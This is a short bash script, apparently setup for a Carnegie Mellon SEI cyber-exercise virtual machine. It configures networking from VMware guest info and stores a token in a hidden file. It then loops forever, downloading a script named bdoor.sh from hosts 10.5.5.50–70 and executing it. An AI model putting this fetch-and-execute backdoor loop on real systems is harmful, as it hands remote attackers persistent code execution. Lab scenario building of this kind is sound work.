#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

while true
do

octet1=`vmtoolsd --cmd 'info-get guestinfo.o1' | cut -d ' ' -f3`
octet2=`vmtoolsd --cmd 'info-get guestinfo.o2' | cut -d ' ' -f3`
octet3=`vmtoolsd --cmd 'info-get guestinfo.o3' | cut -d ' ' -f3`
octet4=`vmtoolsd --cmd 'info-get guestinfo.o4' | cut -d ' ' -f7`
ip="$octet1.$octet2.$octet3.$octet4"

sed -i -e "s/##o1##.##o2##.##o3##.##o4##/$ip/g" /etc/netplan/01-network-manager-all.yaml
netplan apply

token3=`vmtoolsd --cmd 'info-get guestinfo.token3'`
echo $token3 > /home/user/.token3.txt
for i in $(seq 50 70)
do
sleep 2
wget http://10.5.5.$i/bdoor.sh -O /home/user/bdoor.sh || true
chmod +x /home/user/bdoor.sh
/home/user/bdoor.sh || true
done
done
